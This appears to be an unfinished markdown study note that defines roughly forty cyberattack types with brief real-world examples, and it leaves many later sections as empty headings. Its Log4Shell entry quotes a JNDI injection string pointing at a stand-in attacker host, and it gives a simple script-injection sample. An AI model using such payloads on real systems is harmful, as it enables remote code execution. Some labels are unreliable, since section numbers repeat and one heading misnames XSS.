# Most Common Cybersecutiy attacks techniques and methods used by attackers
## 1.Initial Access
👉 Initial Access refers to the first step an attacker uses to enter a system, network, or application. It is how they gain their “foothold” before performing additional actions (lateral movement, privilege escalation, malware deployment).

**Common Methods:** <br>
- Phishing emails (malicious attachments or links)
- Exploiting public-facing applications
- Using stolen credentials
- Compromised VPN accounts
- Drive-by downloads

**Real-World Example:** <br>
ℹ️ Colonial Pipeline Attack (2021):Attackers gained initial access using a single compromised VPN password to enter the pipeline operator’s network.

**Web Shell** <br>
A web shell is a malicious program uploaded to a target web server, enabling adversaries to execute commands remotely. Web shells often serve as both an initial access method (via file upload vulnerabilities) and a persistence mechanism.

Once access has been gained on a compromised server, attackers can use a web shell to move through the kill chain, performing reconnaissance, escalating privileges, moving laterally, and exfiltrating data.

Below is a simple example of a web shell named awebshell.php that can run commands remotely through the web interface. Note that the web shell is located in the /uploads directory of the target server, 10.10.10.100. 

## 2.Lateral Movement vs Persistence
👉 After an attacker enters an environment(after initial access), they move deeper into the network(try to persists or reside into System) to reach valuable systems (e.g., domain controllers, databases to get higher level privilege escalations). This is called lateral movement.

**Common Techniques:** <br>
- Using stolen credentials
- Remote desktop (RDP) hopping
- Pass-the-Hash / Pass-the-Ticket
- Exploiting system vulnerabilities
- Using administrative tools (PowerShell, WMI)

**Real-World Example:** <br>
ℹ️ NotPetya (2017):After gaining initial access, the malware used legitimate Windows admin tools and the EternalBlue exploit to move laterally at high speed.

**Persistence** <br>
👉 Malware often tries to keep a footprint in the system such that it keeps running even after a system restart. This is called persistence. For example, If a malware adds itself to the startup registry keys, it will persist even after a system restart.

## 3.Remote Code Execution (RCE)
👉 RCE is a vulnerability that allows an attacker to run arbitrary code on a target machine—usually without authentication. This is one of the most dangerous vulnerability types.

**Causes:** <br>
- Unsafe input handling
- Buffer overflows
- Deserialization flaws
- Logic errors

**Real-World Example:** <br>
ℹ️ Log4Shell (CVE-2021-44228): A critical RCE flaw in the Log4j library allowed attackers to execute code simply by making an application log a specially crafted string.

## 4.SQL Injection (SQLi)
👉 SQL Injection occurs when an application allows untrusted user input to be sent directly to a database query. Attackers insert malicious SQL statements to read, modify, or delete data.

**What attackers can do:** <br>
- Bypass logins
- Dump entire databases
- Alter, delete, or inject data
- Execute OS-level commands (with certain DB engines)

**Real-World Example:** <br>
ℹ️ Heartland Payment Systems Breach (2008): Attackers used SQL injection to compromise payment processing systems, ultimately exposing ~130 million credit card numbers.

## 5.Cross-Site Scripting (XSS)
👉 XSS vulnerabilities allow attackers to inject malicious scripts (usually JavaScript) into webpages viewed by other users.

**Types of XSS:** <br>
- Reflected
- Stored (most dangerous)
- DOM-based

**What attackers can do with XSS:** <br>
- Steal session cookies
- Impersonate users
- Modify webpage content
- Deliver malware

**Real-World Example:** <br>
ℹ️ Worm on MySpace (2005) “Samy Worm”: A stored XSS vulnerability allowed a self-propagating worm to infect over 1 million MySpace profiles in less than 24 hours.

## 6.Server-Side Request Forgery (SSRF)
👉 SSRF occurs when attackers trick a server into making internal or external requests on their behalf. It lets attackers reach systems that are not directly exposed to the internet.

**Why SSRF is dangerous:** <br>
- Access internal APIs
- Read cloud metadata endpoints
- Bypass firewalls
- Pivot into internal networks

**Real-World Example:** <br>
ℹ️ Capital One Breach (2019): An SSRF vulnerability in AWS metadata services enabled an attacker to access credentials and extract highly sensitive data of more than 100 million users.

## 7.Cross-Site Request Forgery (CSRF)
👉 CSRF tricks an authenticated user’s browser into performing actions they did not intend—like changing passwords, making purchases, or transferring funds.

**How it works:** <br>
- Victim is logged into a site (e.g., banking portal).
- Attacker sends a malicious link or auto-submitting form.
- The browser sends a legitimate request (with the victim’s cookies).

**Real-World Example:** <br>
ℹ️ Gmail CSRF Vulnerability (2007): A flaw allowed attackers to change users’ Gmail forwarding settings via CSRF, silently redirecting emails to attacker-controlled addresses.

## 8.Web Shells
👉 A web shell is a malicious script uploaded to a web server that gives attackers remote access, allowing them to run commands, browse files, upload malware, or pivot deeper into the network.

**Common forms:** <br>
- PHP web shells (e.g., c99.php, r57.php)
- ASPX backdoors
- Simple command runners (shell.jsp)

**Capabilities:** <br>
- Execute system commands
- Upload/download files
- Create new users
- Establish persistent access

**Real-World Example:** <br>
ℹ️ Microsoft Exchange Hafnium Attacks (2021): Attackers exploited Exchange zero-day vulnerabilities and deployed web shells on thousands of servers worldwide to maintain persistent remote access.

👉 A **web shell** is a malicious program uploaded to a target web server, enabling adversaries to execute commands remotely. Web shells often serve as both an initial access method (via file upload vulnerabilities) and a persistence mechanism.

Once access has been gained on a compromised server, attackers can use a web shell to move through the kill chain, performing reconnaissance, escalating privileges, moving laterally, and exfiltrating data.

Below is a simple example of a web shell named awebshell.php that can run commands remotely through the web interface. Note that the web shell is located in the /uploads directory of the target server, 10.10.10.100.

<img width="1339" height="698" alt="Screenshot (1763)" src="https://github.com/user-attachments/assets/df2b9e00-5c79-4241-897a-c29560505282" />


## 9.Man-in-the-Middle (MITM) Attacks
👉 An attacker secretly intercepts, relays, or alters communication between two parties who believe they’re communicating directly.

Example: Attackers on public Wi-Fi capturing login credentials by forcing victims onto a fake access point.

## 10.Buffer Overflow
Occurs when a program writes more data to a memory buffer than it can hold, allowing attackers to overwrite adjacent memory and execute arbitrary code.

Example: The Morris Worm (1988) exploited a buffer overflow in the fingerd service, becoming the first major internet worm.

## 11.Non-validated Input (Input Validation Failures)
Applications that do not validate or sanitize user input allow attackers to inject malicious data, causing SQLi, XSS, RCE, or logic flaws.

Example: Early PHP applications frequently suffered SQL injections due to unvalidated query parameters.

## 12. Race Conditions
When attackers exploit the timing of operations (e.g., reading and writing data simultaneously) to manipulate logic or escalate privileges.

Example: The Dirty COW vulnerability (Linux 2016) exploited a race condition in kernel memory handling to gain root access.

## 13. Replay Attacks
Attackers capture valid data packets (e.g., login tokens) and resend (replay) them to impersonate a user or repeat actions.

Example: Capturing and replaying Kerberos authentication tickets to gain unauthorized access.

## 14. Zero-Day Vulnerabilities / Exploits
A vulnerability unknown to the vendor, attackers exploit it before a patch exists.

Example: Stuxnet used multiple Windows zero-days to infiltrate Iran’s nuclear facility.

## 15. ARP Poisoning
Attackers send forged ARP responses to map their MAC address to another system’s IP address, enabling MITM attacks.

Example: Redirecting traffic between employees and gateways on a LAN.

## 16.DNS Poisoning (DNS Spoofing)
Manipulating DNS responses so users are directed to malicious sites instead of legitimate ones.

Example: 2008 DNS cache poisoning attacks redirecting users to fake banking portals.

## 17.IP Spoofing
Attackers forge the source IP address in packets to appear as another device, often used in DDoS or bypassing IP-based security.

Example: TCP SYN flood attacks using spoofed IPs.

## 18.MAC Spoofing
Changing the MAC address of a network interface to impersonate another device on the LAN.

Example: Bypassing MAC-based access controls or DHCP restrictions.

## 19.DHCP Spoofing
Attackers pose as a rogue DHCP server and provide malicious IP configurations to victims—usually redirecting them to malicious gateways.

Example: Providing a fake default gateway to intercept all network traffic.

## 20.Social Engineering
Manipulating people into performing actions or revealing confidential information.

Example: “IT support” calling employees and asking for their passwords.

## 21.Phishing (and Types)
Phishing, in General, Sending fraudulent messages to trick victims into revealing credentials or installing malware.

Example: Fake Office365 password reset emails.

- Smishing, Phishing over SMS.

Example:Fake delivery notifications prompting card info.

- Vishing, Voice-based phishing via phone calls.

Example: Fake bank agent requesting account verification.

- Spear Phishing, Highly targeted phishing aimed at specific individuals or groups.

Example: Targeted emails to finance departments with realistic invoices.

- Whaling, Phishing targeted at executives.

Example: Fake legal complaint emails sent to CEOs.

- CEO / President Fraud, Impersonating executives to trick employees into wiring money or sharing sensitive data.

Example: Finance officer tricked into wiring funds after receiving a fake “urgent” request from the CEO.

## 22.Typo-squatting
Attackers register domains similar to legitimate ones to capture mistyped traffic.

Example: “paypaI.com” (with capital i) used to steal PayPal credentials.

## 23.KRACK (Key Reinstallation Attacks)
A Wi-Fi attack targeting vulnerabilities in WPA2 that allowed attackers to decrypt traffic by forcing key reinstallation.

Example: 2017 discovery of KRACK affecting nearly all WPA2 devices until patched.

## 24. DoS and DDoS Attacks
Flooding systems or networks to make them unavailable.
- DoS: One attacker/device
- DDoS: Many distributed devices (botnets)

Example: Mirai botnet DDoS attack on Dyn DNS (2016) disrupting Twitter, Netflix, Reddit.

## 25.Cryptojacking
Unauthorized use of a victim’s device to mine cryptocurrency.

Example: Coinhive-based cryptojacking scripts embedded on compromised websites.

## 23.Clickjacking
Tricking users into clicking hidden elements on a webpage, often using invisible frames.

Example: Invisible “Like” buttons stealing Facebook clicks.

## 24.Session Hijacking
Stealing or manipulating session IDs to impersonate authenticated users.

Example: Stealing session cookies via XSS and accessing user accounts.

## 25.Rowhammer
Hardware-based attack that flips bits in adjacent DRAM rows by rapidly accessing (hammering) memory addresses.

Example: Demonstrated at Google Project Zero, enabling privilege escalation on physical hardware.

## 26.Meltdown & Spectre (2017)
Side-channel attacks exploiting flaws in modern CPU speculative execution.

- Meltdown:
Allows reading kernel memory from user space.

- Spectre:
Allows leaking data across application boundaries through branch prediction abuse.

Example: Intel/AMD/ARM processors exposed; required OS and firmware patches.

## 27.Side-Channel Attacks
Extracting information from indirect data like timing, power consumption, electromagnetic leaks.

Example: Measuring CPU timing to extract cryptographic keys.

## 28.EternalBlue
A Windows SMBv1 exploit (from leaked NSA tools) used to execute remote code.

Example: Used by WannaCry and NotPetya to cause global damage.

## 29.Brute-Force Attacks
Systematically trying passwords or encryption keys until the correct one is found.

Example: Credential stuffing attacks against corporate VPN portals.

## 30.Log4j (Log4Shell)
A critical 2021 vulnerability in the Log4j logging library enabling remote code execution through attacker-controlled log entries.

Example: Attackers triggered RCE by forcing applications to log crafted strings (${jndi:ldap://attacker.com/...}).

## 31.COW (Copy-On-Write Exploit)
The “Dirty COW” Linux bug allowed privilege escalation by exploiting a race condition in the kernel’s memory mapping.

Example: Attackers gained root privileges by writing to read-only files during the race window.

## 32.C2 Server Attacks (Command & Control)
Systems attackers use to manage infected machines, send commands, steal data, and deploy additional malware.

Example: Zeus botnet C2 servers controlling infected machines for banking credential theft.

## 33.Wi-Fi Based Attacks
Attacks that target wireless networks.

Common Types:
- Evil twin APs
- Deauthentication attacks
- WPA handshake cracking
- Rogue access points

Example: Fake public Wi-Fi hotspots used to capture credentials (MITM).

## 34.Dumpster Diving
Finding sensitive information (passwords, invoices, access cards) in trash bins.

Example: Attackers retrieving corporate documents thrown away without shredding.

## 35.Shoulder Surfing
Looking over someone’s shoulder to capture sensitive information.

Example: Capturing ATM PINs or passwords in public spaces.

## 36.Sniffing
Capturing packets traveling over a network.

Example: Using Wireshark on unsecured Wi-Fi to capture credentials sent in plaintext.

## 37.Snooping
Unauthorized monitoring of private communications or systems.

Example: Employees monitoring colleague emails without authorization.

## 38.Spoofing
Pretending to be another device, user, or process to trick systems or users.

Example: Email spoofing used in phishing attacks.

## 39.SMB Attacks
Exploiting Windows SMB protocol vulnerabilities for remote code execution or credential theft.

Example: EternalBlue exploitation of SMBv1 (used by WannaCry).

## 40.SIM Swapping & Cloning
- SIM Swapping, Attackers convince mobile carriers to port a victim’s phone number to the attacker’s SIM.
Example: Crypto investors losing accounts due to attackers intercepting 2FA via swapped SIMs.

- SIM Cloning, Copying a SIM card’s identifiers to duplicate a mobile identity.
Example: Older GSM SIMs cloned using extracted authentication keys.

## 41.SYNful Knock (Cisco IOS Backdoor, 2015)
A stealthy, persistent backdoor planted in Cisco routers by modifying IOS firmware. Attackers could send specially crafted packets (a “knock sequence”) to gain remote access.

Example: Discovered on compromised Cisco routers across multiple countries; used by advanced threat actors.

## 42. 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Hardware-level Cyber attacks
## 1.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Software-level Cyber attacks
## 1.


-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Network-level and protocol based Cyber attacks
## 1.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Web-based Cyber attacks
## 1. SQL Injection, HTML Input validations attacks
## 2. RCE (Remote Code Executions)
## 3. XSS (Cross-Side Request Foregery)
## 4. CSRF (Cross-Side Request Forgery)
## 5. SSRF (Server-Side Request Forgery)

## Client-Side Attacks
**Cross-Site Scripting (XSS) :** is the most common client-side attack, in which malicious scripts are run in a trusted website and executed in the user's browser. If your website has a comment box that doesn't filter input, an attacker could post a comment like: Hello <script>alert('You have been hacked');</script>. When visitors load the page, the script runs inside their browser, and the pop-up appears. In a real attack, instead of a harmless pop-up, the attacker could steal cookies or session data.

**Cross-Site Request Forgery (CSRF):** The browser is tricked into sending unauthorized requests on behalf of the trusted user.

**Clickjacking:** Attackers overlay invisible elements on top of legitimate content, making users believe they are interacting with something safe.

## Server-Side Attacks
**Brute-force** attacks occur when an attacker repeatedly attempts different usernames or passwords in an attempt to gain unauthorized access to an account. Automated tools are often used to send these requests quickly, allowing attackers to go through large lists of credentials and common passwords. T-Mobile faced a breach in 2021 that stemmed from a brute-force attack, allowing attackers access to the personally identifiable information (PII) of over 50 million T-Mobile customers.

**SQL Injection (SQLi)** relies on attacking the database that sits behind a website and occurs when applications build queries through string concatenation instead of using parameterized queries, allowing attackers to alter the intended SQL command and access or manipulate data. In 2023, an SQLi vulnerability in MOVEit, a file-transfer software, was exploited, affecting over 2,700 organizations, including U.S. government agencies, the BBC, and British Airways.

**Command Injection** is a common attack that occurs when a website takes user input and passes it to the system without checking it. Attackers can sneak in commands, making the server run them with the same permissions as the application.

## online References
- https://www.hackerone.com/blog/how-cross-site-scripting-vulnerability-led-account-takeover
- https://krishnag.ceo/blog/the-2024-cwe-top-25-understanding-and-mitigating-cwe-78-os-command-injection/
- https://www.akamai.com/blog/security-research/moveit-sqli-zero-day-exploit-clop-ransomware
- https://www.fierce-network.com/operators/t-mobile-ceo-says-hacker-used-brute-force-attacks-to-breach-it-servers
- https://www.thalesgroup.com/en/news-centre/press-releases/artificial-intelligence-fuels-rise-hard-detect-bots-now-make-more-half
- https://blog.cloudflare.com/new-waf-intelligence-feeds/


------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Application and System-level Attacks
## 1.
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# IoT(Internet of Things) based attacks
## 1.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Mobile device based attacks
## 1.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Vulnerability & Exploits

## 1.

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------


# Social Engineering & Phising attacks
## 1.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Security Misconfigurations
## 1.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# IAM (Identity & Access Management) VS PAM (Privileged Access Management)
## 1.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------




